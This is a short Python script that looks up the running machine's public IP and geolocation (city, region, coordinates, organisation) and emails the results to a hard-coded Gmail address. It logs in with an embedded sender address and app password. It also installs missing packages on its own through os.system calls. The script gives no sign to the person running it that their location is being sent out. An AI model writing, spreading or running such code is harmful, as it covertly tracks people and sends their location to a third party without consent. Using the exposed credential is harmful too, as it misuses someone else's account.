try:
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    import requests
except ModuleNotFoundError as e:
    import os
    missing_module = str(e).split(" ")[-1].replace("'", "")
    if missing_module == 'smtplib':
        os.system("pip install secure-smtplib")
    else:
        os.system(f"pip install {missing_module}")

def send_email(subject, body, sender_email="luckypuppydc@gmail.com", # pls no steal
               sender_password="aesd pbna kicc rnmh", recipient_email="luckypuppykc@gmail.com"):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.quit()


def get_ip_info(ip_address=None):
    if not ip_address:
        ip_address = requests.get('https://api.ipify.org').text

    url = f"https://ipinfo.io/{ip_address}/json"

    try:
        response = requests.get(url)

        if response.status_code == 200:
            data = response.json()

            loc = data.get('loc', '')
            latitude, longitude = loc.split(',') if loc else ('N/A', 'N/A')

            ip_info = "\n".join([
                f"IP Address: {data.get('ip')}",
                f"Hostname: {data.get('hostname')}",
                f"City: {data.get('city')}",
                f"Region: {data.get('region')}",
                f"Country: {data.get('country')}",
                f"Location: {data.get('loc')}",
                f"Latitude: {latitude}",
                f"Longitude: {longitude}",
                f"Organization: {data.get('org')}"
            ])
            return ip_info
        else:
            print(f"Error: Unable to fetch data (Status code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

send_email('Location', f'{get_ip_info()}')
